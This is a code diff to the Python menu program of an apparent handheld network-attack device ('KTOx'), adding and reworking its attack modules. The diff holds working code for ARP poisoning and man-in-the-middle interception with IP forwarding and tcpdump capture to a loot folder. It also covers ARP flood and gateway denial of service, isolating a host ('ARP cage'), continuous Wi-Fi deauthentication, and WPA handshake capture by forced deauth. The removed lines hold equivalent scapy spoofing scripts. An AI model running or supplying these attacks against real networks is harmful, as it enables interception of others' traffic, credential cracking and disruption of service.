@@ -86,7 +86,7 @@ _temp_c      = 0.0
 # ── Payload state paths ────────────────────────────────────────────────────────
 
 PAYLOAD_STATE_PATH   = "/dev/shm/ktox_payload_state.json"
-PAYLOAD_REQUEST_PATH = "/dev/shm/ktox_payload_request.json"   # WebUI uses ktox_ prefix
+PAYLOAD_REQUEST_PATH = "/dev/shm/rj_payload_request.json"   # WebUI uses rj_ prefix
 
 # ── Global LCD / image / draw (KTOx pattern — must be globals) ───────────
 
@@ -371,11 +371,11 @@ def getButton(timeout=120):
 
         now = time.time()
 
-        # Stuck-button safety: if same button held >4s without being consumed,
-        # force-clear to prevent freeze
-        if pressed == _last_button and (now - _button_down_since) > 4.0:
+        # Stuck-button safety: if same button held >2s without being consumed,
+        # force-clear to prevent freeze (was 4s, reduced to 2s)
+        if pressed == _last_button and (now - _button_down_since) > 2.0:
             _last_button = None
-            time.sleep(0.1)
+            time.sleep(0.15)
             continue
 
         if pressed != _last_button:
@@ -498,6 +498,7 @@ def GetMenuString(inlist, duplicates=False):
     """
     Scrollable list.  Returns selected label string, or "" on back.
     If duplicates=True returns (int_index, label_string).
+    KEY1/KEY2/KEY3 all act as back/escape.
     """
     WINDOW = 7
     if not inlist:
@@ -528,8 +529,9 @@ def GetMenuString(inlist, duplicates=False):
                 draw.text((5, row_y+1), t, font=text_font, fill=fill)
 
         time.sleep(0.08)
-        btn = getButton()
-        if   btn == "KEY_DOWN_PIN":                    index = (index+1) % total
+        btn = getButton(timeout=120)
+        if   btn is None:                              continue   # timeout — keep waiting
+        elif btn == "KEY_DOWN_PIN":                    index = (index+1) % total
         elif btn == "KEY_UP_PIN":                      index = (index-1) % total
         elif btn in ("KEY_PRESS_PIN","KEY_RIGHT_PIN"):
             raw = inlist[index]
@@ -537,7 +539,7 @@ def GetMenuString(inlist, duplicates=False):
                 idx, txt = raw.split("#", 1)
                 return int(idx), txt
             return raw
-        elif btn in ("KEY_LEFT_PIN","KEY1_PIN"):
+        elif btn in ("KEY_LEFT_PIN","KEY1_PIN","KEY2_PIN","KEY3_PIN"):
             return (-1,"") if duplicates else ""
 
 
@@ -879,12 +881,44 @@ def _pick_host():
     if not hosts:
         Dialog_info("No hosts.\nRun scan first.", wait=True)
         return None
+
     items = []
     for h in hosts:
         ip = h.get("ip") if isinstance(h, dict) else (h[0] if len(h)>0 else "?")
         items.append(f" {ip}")
-    sel = GetMenuString(items)
-    return sel.strip() if sel else None
+
+    WINDOW = 6
+    total  = len(items)
+    sel    = 0
+
+    while True:
+        offset = max(0, min(sel-2, total-WINDOW))
+        window = items[offset:offset+WINDOW]
+
+        with draw_lock:
+            _draw_toolbar()
+            draw.rectangle([0,12,128,128], fill=color.background)
+            color.DrawBorder()
+            draw.rectangle([3,13,125,24], fill="#1a0000")
+            _centered("Pick Target", 13, font=small_font, fill=color.border)
+            draw.line([3,24,125,24], fill=color.border, width=1)
+            for i, ip in enumerate(window):
+                row_y  = 26 + 13*i
+                is_sel = (i == sel-offset)
+                if is_sel:
+                    draw.rectangle([3, row_y, 124, row_y+12], fill=color.select)
+                draw.text((5, row_y+1), ip[:22], font=text_font,
+                          fill=color.selected_text if is_sel else color.text)
+            draw.line([3,112,125,112], fill="#2a0505", width=1)
+            _centered("CTR=select  LEFT=back", 114, font=small_font, fill="#4a2020")
+
+        btn = getButton(timeout=120)
+        if   btn is None:                               continue
+        elif btn == "KEY_DOWN_PIN":                     sel = (sel+1) % total
+        elif btn == "KEY_UP_PIN":                       sel = (sel-1) % total
+        elif btn in ("KEY_PRESS_PIN","KEY_RIGHT_PIN"):  return items[sel]
+        elif btn in ("KEY_LEFT_PIN","KEY1_PIN",
+                     "KEY2_PIN","KEY3_PIN"):            return None
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # ── KTOx attack modules ────────────────────────────────────────────────────────
@@ -910,53 +944,37 @@ def do_network_scan():
 
 
 def do_arp_kick(target_ip):
-    _run_attack("ARP KICK", [
-        "python3","-c",
-        f"""
-import sys,time; sys.path.insert(0,'{KTOX_DIR}')
-from scapy.all import *
-iface='{ktox_state["iface"]}'; gw='{ktox_state["gateway"]}'; tgt='{target_ip}'
-try:
-    iface_mac=get_if_hwaddr(iface)
-    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
-    tgt_mac=ans[0][1][Ether].src if ans else 'ff:ff:ff:ff:ff:ff'
-    print(f'Kicking {{tgt}} via {{iface}}')
-    for i in range(600):
-        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=gw,hwsrc=iface_mac),iface=iface,verbose=0)
-        time.sleep(5)
-except Exception as e:
-    print(f'Error: {{e}}')
-"""
-    ])
+    iface = ktox_state["iface"]
+    gw    = ktox_state["gateway"]
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["arpspoof", "-i", iface, "-t", target_ip, gw],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = "ARP KICK"
+    Dialog_info(f"ARP KICK active\n{target_ip}\nKEY3=stop", wait=True)
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = None
+    Dialog_info("Kick stopped.", wait=False, timeout=1)
 
 
 def do_mitm(target_ip):
-    _run_attack("ARP MITM", [
-        "python3","-c",
-        f"""
-import sys,os,time; sys.path.insert(0,'{KTOX_DIR}')
-from scapy.all import *
-iface='{ktox_state["iface"]}'; gw='{ktox_state["gateway"]}'; tgt='{target_ip}'
-os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-try:
-    iface_mac=get_if_hwaddr(iface)
-    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
-    tgt_mac=ans[0][1][Ether].src if ans else None
-    ans2,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gw),timeout=2,verbose=0,iface=iface)
-    gw_mac=ans2[0][1][Ether].src if ans2 else None
-    if not tgt_mac or not gw_mac: print('Cannot resolve MACs'); sys.exit(1)
-    print(f'MITM: {{tgt}} <-> {{gw}}')
-    while True:
-        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=gw,hwsrc=iface_mac),iface=iface,verbose=0)
-        sendp(Ether(dst=gw_mac)/ARP(op=2,pdst=gw,hwdst=gw_mac,psrc=tgt,hwsrc=iface_mac),iface=iface,verbose=0)
-        time.sleep(3)
-except Exception as e:
-    print(f'Error: {{e}}')
-finally:
-    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
-    print('IP forwarding disabled')
-"""
-    ])
+    iface = ktox_state["iface"]
+    gw    = ktox_state["gateway"]
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    subprocess.Popen(["arpspoof", "-i", iface, "-t", target_ip, gw],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, target_ip],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = "MITM"
+    Dialog_info(f"MITM active\n{target_ip}\nFwd ON\nKEY3=stop", wait=True)
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    ktox_state["running"] = None
+    Dialog_info("MITM stopped.\nFwd OFF.", wait=False, timeout=1)
 
 
 def do_wifi_monitor_on():
@@ -1002,20 +1020,30 @@ def do_wifi_scan():
 
 
 def do_arp_watch():
-    _run_attack("ARP WATCH",[
-        "python3","-c",
-        "from scapy.all import sniff,ARP\n"
-        "known={}\n"
-        "def h(p):\n"
-        "  if ARP in p and p[ARP].op==2:\n"
-        "    ip=p[ARP].psrc;mac=p[ARP].hwsrc\n"
-        "    if ip in known and known[ip]!=mac:\n"
-        "      print(f'! CONFLICT {ip} {known[ip][:11]} -> {mac[:11]}')\n"
-        "    known[ip]=mac\n"
-        "sniff(prn=h,filter='arp',store=0)"
+    _run_attack("ARP WATCH", [
+        "python3", "-c",
+        "import subprocess, time\n"
+        "print('ARP Watch — KEY3=stop')\n"
+        "def snap():\n"
+        "    out = subprocess.check_output(['arp','-an'],text=True,timeout=5)\n"
+        "    t = {}\n"
+        "    for ln in out.splitlines():\n"
+        "        p = ln.split()\n"
+        "        try:\n"
+        "            ip=p[1].strip('()'); mac=p[3]\n"
+        "            if mac!='<incomplete>': t[ip]=mac\n"
+        "        except: pass\n"
+        "    return t\n"
+        "base=snap(); print(f'Baseline: {len(base)} entries')\n"
+        "while True:\n"
+        "    time.sleep(8); cur=snap()\n"
+        "    for ip,mac in cur.items():\n"
+        "        if ip in base and base[ip]!=mac:\n"
+        "            print(f'! POISON {ip} {base[ip][:11]}->{mac[:11]}')\n"
+        "        elif ip not in base:\n"
+        "            print(f'+ NEW {ip} {mac}')\n"
+        "    base=cur\n"
     ])
-
-
 def do_arp_diff():
     _run_attack("ARP DIFF",[
         "python3","-c",
@@ -1140,10 +1168,6 @@ def do_baseline_export():
     Dialog_info(f"✔ Saved:\nbaseline_{ts[:8]}\n{len(data['hosts'])} hosts", wait=True)
 
 
-def do_start_mitm_suite():
-    exec_payload(os.path.join(KTOX_DIR, "ktox_mitm.py"))
-
-
 def do_dns_spoofing():
     sites = sorted([
         d for d in os.listdir(f"{INSTALL_PATH}DNSSpoof/sites")
@@ -1172,6 +1196,142 @@ def do_dns_spoof_stop():
     subprocess.run("pkill -f 'ettercap'", shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     Dialog_info("DNS Spoof\nstopped.", wait=True)
+
+def do_start_mitm_suite():
+    """Full on-device MITM: pick host, ARP poison both ways, tcpdump capture."""
+    tgt = _pick_host()
+    if not tgt:
+        return
+    iface = ktox_state["iface"]
+    gw    = ktox_state["gateway"]
+    if not gw:
+        Dialog_info("No gateway!\nRun scan first.", wait=True)
+        return
+    if not YNDialog("FULL MITM", y="Yes", n="No", b=f"{tgt}\nAll traffic?"):
+        return
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["arpspoof", "-i", iface, "-t", tgt, gw],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, tgt],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
+    pcap = f"{LOOT_DIR}/mitm_{ts}.pcap"
+    os.makedirs(LOOT_DIR, exist_ok=True)
+    subprocess.Popen(["tcpdump", "-i", iface, "-w", pcap, "-q"],
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = "MITM SUITE"
+    Dialog_info(f"MITM ACTIVE\n{tgt}\nCapturing...\nKEY3=stop", wait=True)
+    subprocess.run(["pkill", "-9", "arpspoof"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["pkill", "-9", "tcpdump"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    ktox_state["running"] = None
+    Dialog_info(f"MITM stopped.\nPCAP: {os.path.basename(pcap)}", wait=True)
+
+
+def do_deauth_targeted():
+    """Scan APs, pick one, run continuous deauth until KEY3."""
+    mon = ktox_state.get("mon_iface")
+    if not mon:
+        Dialog_info("Enable monitor\nmode first.", wait=True)
+        return
+    Dialog_info("Scanning APs\n10 seconds...", wait=False, timeout=1)
+    import glob, csv
+    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+    tmp = f"/tmp/ktox_scan_{ts}"
+    os.makedirs(tmp, exist_ok=True)
+    proc = subprocess.Popen(
+        ["airodump-ng", "--write", f"{tmp}/s", "--output-format", "csv",
+         "--write-interval", "5", mon],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(10)
+    proc.terminate()
+    aps = []
+    for cp in glob.glob(f"{tmp}/s*.csv"):
+        try:
+            for row in csv.reader(open(cp, errors="ignore")):
+                if len(row) < 14: continue
+                bssid=row[0].strip(); ch=row[3].strip(); essid=row[13].strip()
+                if bssid and ":" in bssid and bssid!="BSSID" and ch.isdigit():
+                    aps.append((bssid, ch, essid[:14] or "hidden"))
+        except Exception: pass
+    if not aps:
+        Dialog_info("No APs found.\nTry again.", wait=True)
+        return
+    items = [f" {e}  ch{c}" for b,c,e in aps]
+    sel   = GetMenuString(items)
+    if not sel: return
+    bssid, ch, essid = aps[items.index(sel)]
+    if not YNDialog("DEAUTH", y="Yes", n="No", b=f"{essid}\nch{ch}?"):
+        return
+    subprocess.run(["pkill", "-9", "aireplay-ng"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    proc2 = subprocess.Popen(
+        ["aireplay-ng", "--deauth", "0", "-a", bssid, mon],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = "DEAUTH"
+    Dialog_info(f"DEAUTH active\n{essid}\nch{ch}\nKEY3=stop", wait=True)
+    proc2.terminate()
+    subprocess.run(["pkill", "-9", "aireplay-ng"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ktox_state["running"] = None
+    Dialog_info("Deauth stopped.", wait=False, timeout=1)
+
+
+def do_handshake_targeted():
+    """Scan APs, pick one, capture WPA handshake via forced deauth."""
+    mon = ktox_state.get("mon_iface")
+    if not mon:
+        Dialog_info("Enable monitor\nmode first.", wait=True)
+        return
+    Dialog_info("Scanning APs\n10 seconds...", wait=False, timeout=1)
+    import glob, csv
+    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+    tmp = f"/tmp/ktox_hs_{ts}"
+    os.makedirs(tmp, exist_ok=True)
+    proc = subprocess.Popen(
+        ["airodump-ng", "--write", f"{tmp}/s", "--output-format", "csv",
+         "--write-interval", "5", mon],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(10)
+    proc.terminate()
+    aps = []
+    for cp in glob.glob(f"{tmp}/s*.csv"):
+        try:
+            for row in csv.reader(open(cp, errors="ignore")):
+                if len(row) < 14: continue
+                bssid=row[0].strip(); ch=row[3].strip(); essid=row[13].strip()
+                if bssid and ":" in bssid and bssid!="BSSID" and ch.isdigit():
+                    aps.append((bssid, ch, essid[:14] or "hidden"))
+        except Exception: pass
+    if not aps:
+        Dialog_info("No APs found.", wait=True)
+        return
+    items = [f" {e}  ch{c}" for b,c,e in aps]
+    sel   = GetMenuString(items)
+    if not sel: return
+    bssid, ch, essid = aps[items.index(sel)]
+    if not YNDialog("HANDSHAKE", y="Yes", n="No", b=f"{essid}\nch{ch}?"):
+        return
+    out_ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
+    outdir  = f"{LOOT_DIR}/handshakes"
+    os.makedirs(outdir, exist_ok=True)
+    outpath = f"{outdir}/hs_{essid.replace(' ','_')}_{out_ts}"
+    cap = subprocess.Popen(
+        ["airodump-ng", "-c", ch, "--bssid", bssid, "-w", outpath, mon],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(3)
+    subprocess.run(["aireplay-ng", "--deauth", "4", "-a", bssid, mon],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    Dialog_info(f"Capturing HS\n{essid}\nKEY3=stop\n~30 sec", wait=True)
+    cap.terminate()
+    subprocess.run(["pkill", "-9", "airodump-ng"],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    Dialog_info(f"Saved:\nhs_{essid[:14]}\nUse aircrack-ng", wait=True)
+
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # ── Payload directory scanner ──────────────────────────────────────────────────
@@ -1258,8 +1418,8 @@ class KTOxMenu:
             (" Enable Monitor",  do_wifi_monitor_on),
             (" Disable Monitor", do_wifi_monitor_off),
             (" WiFi Scan",       do_wifi_scan),
-            (" Deauth (Payload)",partial(exec_payload,"interception/deauth")),
-            (" Handshake Cap",   self._handshake),
+            (" Deauth AP",       do_deauth_targeted),
+            (" Handshake Cap",   do_handshake_targeted),
             (" PMKID Attack",    self._pmkid),
             (" Evil Twin AP",    self._evil_twin),
             (" Select Adapter",  self._select_adapter),
@@ -1305,6 +1465,7 @@ class KTOxMenu:
             (" WebUI Status",    self._webui_status),
             (" Refresh State",   self._refresh),
             (" System Info",     self._sysinfo),
+            (" OTA Update",      partial(exec_payload,"general/auto_update")),
             (" Discord Webhook", self._discord_status),
             (" Reboot",          self._reboot),
             (" Shutdown",        self._shutdown),
@@ -1413,12 +1574,51 @@ class KTOxMenu:
         if not hosts:
             Dialog_info("No hosts.\nRun scan first.", wait=True)
             return
+
+        # Build display lines
         lines = []
         for h in hosts:
             ip  = h.get("ip") if isinstance(h, dict) else (h[0] if len(h)>0 else "?")
             mac = h.get("mac") if isinstance(h, dict) else (h[1] if len(h)>1 else "")
-            lines.append(f" {ip}  {mac[:8]}")
-        GetMenuString(lines)
+            lines.append(f"{ip}  {mac[:8]}".strip())
+        if not lines:
+            Dialog_info("No hosts found.", wait=True)
+            return
+
+        WINDOW = 6
+        total  = len(lines)
+        sel    = 0
+
+        while True:
+            offset = max(0, min(sel-2, total-WINDOW))
+            window = lines[offset:offset+WINDOW]
+
+            with draw_lock:
+                _draw_toolbar()
+                draw.rectangle([0,12,128,128], fill=color.background)
+                color.DrawBorder()
+                # Title
+                draw.rectangle([3,13,125,24], fill="#1a0000")
+                _centered(f"Hosts ({total})", 13, font=small_font, fill=color.border)
+                draw.line([3,24,125,24], fill=color.border, width=1)
+                # Rows
+                for i, txt in enumerate(window):
+                    row_y = 26 + 13*i
+                    is_sel = (i == sel-offset)
+                    if is_sel:
+                        draw.rectangle([3, row_y, 124, row_y+12], fill=color.select)
+                    draw.text((5, row_y+1), txt[:22], font=small_font,
+                              fill=color.selected_text if is_sel else color.text)
+                # Footer hint
+                draw.line([3,112,125,112], fill="#2a0505", width=1)
+                _centered("LEFT=back  KEY2=home", 114, font=small_font, fill="#4a2020")
+
+            btn = getButton(timeout=120)
+            if   btn is None:                                  continue
+            elif btn == "KEY_DOWN_PIN":                        sel = (sel+1) % total
+            elif btn == "KEY_UP_PIN":                         sel = (sel-1) % total
+            elif btn in ("KEY_LEFT_PIN","KEY1_PIN",
+                         "KEY2_PIN","KEY3_PIN"):              return
 
     def _ping_gw(self):
         gw = ktox_state["gateway"]
@@ -1460,92 +1660,64 @@ class KTOxMenu:
             do_mitm(tgt)
 
     def _arp_flood(self):
-        tgt = _pick_host()
+        tgt   = _pick_host()
+        iface = ktox_state["iface"]
         if tgt and YNDialog("ARP FLOOD", y="Yes", n="No", b=f"Flood {tgt}?"):
-            _run_attack("ARP FLOOD", [
-                "python3","-c",
-                f"""
-import sys,time; sys.path.insert(0,'{KTOX_DIR}')
-from scapy.all import *
-iface='{ktox_state["iface"]}'; tgt='{tgt}'
-try:
-    iface_mac=get_if_hwaddr(iface)
-    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
-    tgt_mac=ans[0][1][Ether].src if ans else 'ff:ff:ff:ff:ff:ff'
-    print(f'Flooding {{tgt}}')
-    while True:
-        for fake_ip in ['10.0.0.{{}}'.format(i) for i in range(1,254)]:
-            sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=fake_ip,hwsrc=iface_mac),iface=iface,verbose=0)
-        time.sleep(0.2)
-except Exception as e:
-    print(f'Error: {{e}}')
-"""
-            ])
-
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            for fake in [f"10.0.0.{i}" for i in range(1, 20)]:
+                subprocess.Popen(["arpspoof", "-i", iface, "-t", tgt, fake],
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = "ARP FLOOD"
+            Dialog_info(f"ARP FLOOD\n{tgt}\n20 sources\nKEY3=stop", wait=True)
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = None
+            Dialog_info("Flood stopped.", wait=False, timeout=1)
     def _gw_dos(self):
-        gw = ktox_state["gateway"]
+        gw    = ktox_state["gateway"]
+        iface = ktox_state["iface"]
         if not gw:
             Dialog_info("No gateway!", wait=True)
             return
         if YNDialog("GW DoS", y="Yes", n="No", b=f"DoS {gw}?"):
-            _run_attack("GW DoS", [
-                "python3","-c",
-                f"""
-import sys,time; sys.path.insert(0,'{KTOX_DIR}')
-from scapy.all import *
-iface='{ktox_state["iface"]}'; gw='{gw}'
-iface_mac=get_if_hwaddr(iface)
-print(f'DoS on {{gw}}')
-while True:
-    for fake in ['192.168.0.{{}}'.format(i) for i in range(1,255)]:
-        sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=2,pdst=gw,psrc=fake,hwsrc=iface_mac),iface=iface,verbose=0)
-    time.sleep(0.05)
-"""
-            ])
-
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            for fake in [f"10.33.0.{i}" for i in range(1, 20)]:
+                subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, fake],
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = "GW DoS"
+            Dialog_info(f"GW DoS active\n{gw}\nKEY3=stop", wait=True)
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = None
+            Dialog_info("DoS stopped.", wait=False, timeout=1)
     def _arp_cage(self):
-        tgt = _pick_host()
-        gw  = ktox_state["gateway"]
+        tgt   = _pick_host()
+        gw    = ktox_state["gateway"]
+        iface = ktox_state["iface"]
         if not tgt or not gw:
             return
         if YNDialog("ARP CAGE", y="Yes", n="No", b=f"Cage {tgt}?"):
-            _run_attack("ARP CAGE", [
-                "python3","-c",
-                f"""
-import sys,time; sys.path.insert(0,'{KTOX_DIR}')
-from scapy.all import *
-iface='{ktox_state["iface"]}'; gw='{gw}'; tgt='{tgt}'
-try:
-    iface_mac=get_if_hwaddr(iface)
-    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
-    tgt_mac=ans[0][1][Ether].src if ans else 'ff:ff:ff:ff:ff:ff'
-    ans2,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gw),timeout=2,verbose=0,iface=iface)
-    gw_mac=ans2[0][1][Ether].src if ans2 else 'ff:ff:ff:ff:ff:ff'
-    fake='10.66.66.66'
-    print(f'Caging {{tgt}}')
-    while True:
-        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=gw,hwsrc=iface_mac),iface=iface,verbose=0)
-        sendp(Ether(dst=gw_mac)/ARP(op=2,pdst=gw,hwdst=gw_mac,psrc=tgt,hwsrc=iface_mac),iface=iface,verbose=0)
-        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=fake,hwsrc=iface_mac),iface=iface,verbose=0)
-        time.sleep(3)
-except Exception as e:
-    print(f'Error: {{e}}')
-finally:
-    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
-"""
-            ])
-
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen(["arpspoof", "-i", iface, "-t", tgt, gw],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen(["arpspoof", "-i", iface, "-t", gw, tgt],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = "ARP CAGE"
+            Dialog_info(f"Cage ACTIVE\n{tgt}\nisolated\nKEY3=release", wait=True)
+            subprocess.run(["pkill", "-9", "arpspoof"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            ktox_state["running"] = None
+            Dialog_info("Cage released.", wait=False, timeout=1)
     def _ntlm(self):
         self.navigate("resp")
 
     # ── WiFi actions ──────────────────────────────────────────────────────────
 
     def _handshake(self):
-        mon = ktox_state.get("mon_iface")
-        if not mon:
-            Dialog_info("Enable monitor\nmode first.", wait=True)
-            return
-        exec_payload("wifi/wifi_handshake_capture")
+        do_handshake_targeted()
 
     def _pmkid(self):
         mon = ktox_state.get("mon_iface")
